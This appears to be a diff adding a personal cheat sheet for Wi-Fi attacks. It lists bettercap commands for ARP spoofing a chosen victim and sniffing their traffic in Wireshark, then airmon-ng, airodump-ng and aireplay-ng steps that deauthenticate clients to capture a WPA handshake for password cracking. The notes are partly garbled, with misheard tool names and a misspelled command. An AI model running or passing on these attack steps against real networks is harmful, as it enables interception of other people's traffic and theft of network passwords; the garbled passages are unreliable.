@@ -1,0 +1,30 @@
+instruction machine wireless-h
+1.open terminal and  typing *sudo bettercap -iface wlan0
+MAN IN MIDDLE ATTACK *command
+1.2.*net.probe on
+1.3. *net.show
+1.4. *set arp.spoof.fullduplex true
+1.5. *set arp.spoof.targets <ip victim> I saw and choiced with *net.show.
+1.6. *arp.spoof on 
+2. open wireshark (capture network package)
+ip_src == <ip_victim>
+
+Attack with crack password network
+
+1.my network adapter into monitor mode by doing airon NG WN
+appy command:
+1.1 sudo airmon-ng wlan0 start
+type an iwconfig just to make sure it is up and running and monitor.
+sudo airmon-ng check kill (check and kill those process)
+2. Now it's time to start the monitoring with one command arrow dump
+2.1 sudo airodump-ng wlan0 -abg (dash abg to monitor all types of wireless channels)
+3. if you want to go deeper and research more. Using the same command as earlier.
+3.1 sudo airdump-ng -bssid <mac address victim> -c 2 wlan0(wirelss interface)
+But the hacker can abuse that by sending his own DO message pretending to be
+the wifi router to the clients. And what are the going to do?
+They're going listen. They're like, oh, I'm just going to disconnect and
+then reconnect. So if the airplay and G command, the nube does that,
+You can either target one individual person that scanned and recon or the
+entire network and all clients get authenicated all at once
+you capture a four-war handshake when they try to reconnect.
+3.2 sudo aireplay-ng -0 0 -a <mac victim> wlan0 
